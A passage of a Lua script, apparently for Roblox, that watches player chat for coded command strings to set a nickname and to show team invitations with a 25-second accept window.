		local command, message = string.match(msg, '^(%S+)%s+(.*)$')
		if command == "..".. speakersname .."1215" and message then
            givennick = message
            notif(givennick)
        end
	end)
end

function ConnectP3(plr)
    if plr == playerA then return end
	plr.Chatted:Connect(function(msg)
		local command, message = string.match(msg, '^(%S+)%s+(.*)$')
		if command == "..askforconnect8172" and message then
			if not message == speakersname then return end
            connectoptionperms = true
            if givennick then
                notif(requestername .. " has invited you to their team as ".. givennick)
                notif("Type >yes to accept, >no to decline. This request lasts for 25 seconds")
            else
                notif(requestername .. " has invited you to their team ")
                notif("Type >yes to accept, >no to decline. This request lasts for 25 seconds")
            end
            wait(25)
            if connectoptionperms then
                notif("Time ran out. Declined request")
                sc("..requestdecline122")
            end
		end
	end)
end

